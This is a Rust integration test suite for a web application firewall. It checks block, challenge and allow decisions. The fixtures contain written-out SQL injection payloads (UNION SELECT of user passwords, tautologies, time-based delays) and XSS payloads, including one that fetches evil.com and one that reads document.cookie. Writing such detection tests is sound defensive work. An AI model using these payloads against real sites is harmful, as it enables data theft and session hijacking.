//! # tests/integration.rs – Integration Test Suite
//!
//! These tests exercise the full detection-and-decision pipeline without
//! a live Envoy instance. They call the public APIs of each module directly,
//! verifying that:
//!
//! 1. Known-malicious payloads produce `Decision::Block`.
//! 2. Legitimate payloads produce `Decision::Allow`.
//! 3. Edge cases (empty bodies, oversized input, non-UTF-8) are handled
//!    gracefully without panics.
//!
//! ## Running
//! ```bash
//! cargo test                         # native host (fast)
//! cargo test --target wasm32-wasi    # Wasm target via wasmtime runner
//! ```

mod proxy_mock;

use neuroguard_waf::{
    decision,
    detectors::{bot, sqli, xss, DetectorSets},
    semantic::scorer,
    types::{AttackType, Decision, ThreatReport, WafConfig},
};

// ─────────────────────────────────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────────────────────────────────

/// Build compiled detector sets. Panics in tests if patterns are invalid –
/// this is intentional: pattern errors must fail loudly in CI.
fn build_sets() -> DetectorSets {
    DetectorSets::build().expect("DetectorSets::build failed in test")
}

/// Run the full pipeline (detectors + AI + decision) on a given payload.
/// Returns the final `Decision`.
fn run_pipeline(
    payload: &str,
    user_agent: &str,
    config: &WafConfig,
    sets: &DetectorSets,
) -> Decision {
    let mut findings: Vec<ThreatReport> = Vec::new();

    // Bot detection
    if config.enable_bot_detection {
        if let Some(r) = bot::detect(user_agent, &sets.bot) {
            findings.push(r);
        }
    }

    // SQLi + XSS on payload (simulates path + body combined)
    if config.enable_sqli {
        if let Some(r) = sqli::detect(payload, &sets.sqli) {
            findings.push(r);
        }
    }
    if config.enable_xss {
        if let Some(r) = xss::detect(payload, &sets.xss) {
            findings.push(r);
        }
    }

    let ai_score = scorer::calculate_risk_score(payload.as_bytes());

    decision::evaluate(
        &findings,
        ai_score,
        config.confidence_threshold,
        config.ai_score_threshold,
    )
}

// ─────────────────────────────────────────────────────────────────────────────
// SQL Injection tests
// ─────────────────────────────────────────────────────────────────────────────

#[test]
fn sqli_union_select_is_blocked() {
    let sets = build_sets();
    let config = WafConfig::default();
    let payload = "1 UNION SELECT username, password FROM users--";

    let decision = run_pipeline(payload, "Mozilla/5.0", &config, &sets);
    assert_eq!(decision, Decision::Block, "UNION SELECT must be blocked");
}

#[test]
fn sqli_or_tautology_is_blocked() {
    let sets = build_sets();
    let config = WafConfig::default();
    let payloads = ["' OR '1'='1", "1 OR 1=1 --", "admin' OR 1=1#"];
    for p in &payloads {
        let d = run_pipeline(p, "Mozilla/5.0", &config, &sets);
        assert_eq!(d, Decision::Block, "OR tautology must be blocked: {}", p);
    }
}

#[test]
fn sqli_time_based_is_blocked() {
    let sets = build_sets();
    let config = WafConfig::default();

    let d = run_pipeline("'; SELECT SLEEP(5)--", "Mozilla/5.0", &config, &sets);
    assert_eq!(d, Decision::Block);

    let d2 = run_pipeline("1; WAITFOR DELAY '0:0:5'--", "Mozilla/5.0", &config, &sets);
    assert_eq!(d2, Decision::Block);
}

#[test]
fn sqli_information_schema_is_blocked() {
    let sets = build_sets();
    let config = WafConfig::default();
    let d = run_pipeline(
        "SELECT table_name FROM information_schema.tables",
        "Mozilla/5.0",
        &config,
        &sets,
    );
    assert_eq!(d, Decision::Block);
}

// ─────────────────────────────────────────────────────────────────────────────
// XSS tests
// ─────────────────────────────────────────────────────────────────────────────

#[test]
fn xss_script_tag_is_blocked() {
    let sets = build_sets();
    let config = WafConfig::default();
    let d = run_pipeline(
        "<script>alert(document.cookie)</script>",
        "Mozilla/5.0",
        &config,
        &sets,
    );
    assert_eq!(d, Decision::Block);
}

#[test]
fn xss_event_handler_is_blocked() {
    let sets = build_sets();
    let config = WafConfig::default();
    let d = run_pipeline(
        r#"<img src=x onerror="fetch('https://evil.com')">"#,
        "Mozilla/5.0",
        &config,
        &sets,
    );
    assert_eq!(d, Decision::Block);
}

#[test]
fn xss_javascript_uri_is_blocked() {
    let sets = build_sets();
    let config = WafConfig::default();
    let d = run_pipeline(
        r#"<a href="javascript:alert(1)">click</a>"#,
        "Mozilla/5.0",
        &config,
        &sets,
    );
    assert_eq!(d, Decision::Block);
}

// ─────────────────────────────────────────────────────────────────────────────
// Bot detection tests
// ─────────────────────────────────────────────────────────────────────────────

#[test]
fn bot_sqlmap_ua_is_blocked() {
    let sets = build_sets();
    let config = WafConfig::default();
    // sqlmap UA alone has confidence 0.85 which is below the 0.9 block
    // threshold. It will CHALLENGE, not BLOCK, in v0.1.
    // Combine with a SQLi payload to trigger a block.
    let d = run_pipeline(
        "1 UNION SELECT 1,2,3--",
        "sqlmap/1.7.8#stable",
        &config,
        &sets,
    );
    assert_eq!(d, Decision::Block, "sqlmap UA + SQLi payload must block");
}

#[test]
fn bot_ua_alone_challenges() {
    let sets = build_sets();
    let config = WafConfig::default();
    // Clean payload but scanner UA → Challenge (not Block in v0.1)
    let d = run_pipeline("GET /index.html HTTP/1.1", "sqlmap/1.7.8", &config, &sets);
    assert_eq!(d, Decision::Challenge, "scanner UA alone must challenge");
}

// ─────────────────────────────────────────────────────────────────────────────
// Clean request tests
// ─────────────────────────────────────────────────────────────────────────────

#[test]
fn clean_request_is_allowed() {
    let sets = build_sets();
    let config = WafConfig::default();
    let ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0";

    let clean_payloads = [
        "Hello, world!",
        r#"{"username":"alice","password":"s3cr3t!"}"#,
        "SELECT is a word I use in conversation",
        "John O'Brien visited the site",
    ];

    for p in &clean_payloads {
        let d = run_pipeline(p, ua, &config, &sets);
        assert_eq!(d, Decision::Allow, "clean payload must be allowed: {}", p);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Configuration toggle tests
// ─────────────────────────────────────────────────────────────────────────────

#[test]
fn sqli_disabled_allows_sqli_payload() {
    let sets = build_sets();
    let config = WafConfig {
        enable_sqli: false,
        ..WafConfig::default()
    };
    let d = run_pipeline(
        "1 UNION SELECT username FROM users",
        "Mozilla/5.0",
        &config,
        &sets,
    );
    // With SQLi disabled and no XSS, bot, or AI findings, should Allow.
    assert_eq!(d, Decision::Allow, "disabled SQLi rule must not block");
}

#[test]
fn xss_disabled_allows_xss_payload() {
    let sets = build_sets();
    let config = WafConfig {
        enable_xss: false,
        ..WafConfig::default()
    };
    let d = run_pipeline("<script>alert(1)</script>", "Mozilla/5.0", &config, &sets);
    assert_eq!(d, Decision::Allow, "disabled XSS rule must not block");
}

// ─────────────────────────────────────────────────────────────────────────────
// Decision engine unit tests (direct)
// ─────────────────────────────────────────────────────────────────────────────

#[test]
fn decision_blocks_on_high_confidence_report() {
    let reports = vec![ThreatReport::new(
        AttackType::SqlInjection,
        0.95,
        "UNION SELECT",
        Some(0),
    )];
    let d = decision::evaluate(&reports, 0.0, 0.9, 0.8);
    assert_eq!(d, Decision::Block);
}

#[test]
fn decision_blocks_on_high_ai_score() {
    let d = decision::evaluate(&[], 0.85, 0.9, 0.8);
    assert_eq!(d, Decision::Block);
}

#[test]
fn decision_challenges_on_low_confidence() {
    let reports = vec![ThreatReport::new(
        AttackType::Bot,
        0.50,
        "<missing ua>",
        None,
    )];
    let d = decision::evaluate(&reports, 0.0, 0.9, 0.8);
    assert_eq!(d, Decision::Challenge);
}

#[test]
fn decision_allows_clean() {
    let d = decision::evaluate(&[], 0.0, 0.9, 0.8);
    assert_eq!(d, Decision::Allow);
}

// ─────────────────────────────────────────────────────────────────────────────
// AI scorer stub tests
// ─────────────────────────────────────────────────────────────────────────────

#[test]
fn ai_scorer_always_returns_zero_in_stub() {
    let payloads: &[&[u8]] = &[
        b"",
        b"UNION SELECT * FROM users",
        b"<script>alert(1)</script>",
        &[0u8; 1024 * 1024], // 1 MB of zeros
    ];
    for p in payloads {
        let score = scorer::calculate_risk_score(p);
        assert!(
            (score - 0.0).abs() < f32::EPSILON,
            "stub must return 0.0 for all inputs"
        );
        assert!((0.0..=1.0).contains(&score), "score must be in [0.0, 1.0]");
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Edge case / robustness tests
// ─────────────────────────────────────────────────────────────────────────────

#[test]
fn empty_payload_is_allowed() {
    let sets = build_sets();
    let config = WafConfig::default();
    let d = run_pipeline("", "Mozilla/5.0", &config, &sets);
    assert_eq!(d, Decision::Allow);
}

#[test]
fn payload_with_only_whitespace_is_allowed() {
    let sets = build_sets();
    let config = WafConfig::default();
    let d = run_pipeline("   \t\n  ", "Mozilla/5.0", &config, &sets);
    assert_eq!(d, Decision::Allow);
}

#[test]
fn very_long_clean_payload_is_allowed() {
    let sets = build_sets();
    let config = WafConfig::default();
    let payload = "A".repeat(10_000);
    let d = run_pipeline(&payload, "Mozilla/5.0", &config, &sets);
    assert_eq!(d, Decision::Allow);
}

#[test]
fn sqli_detect_returns_none_on_empty() {
    let sets = build_sets();
    let r = sqli::detect("", &sets.sqli);
    assert!(r.is_none());
}

#[test]
fn xss_detect_returns_none_on_empty() {
    let sets = build_sets();
    let r = xss::detect("", &sets.xss);
    assert!(r.is_none());
}
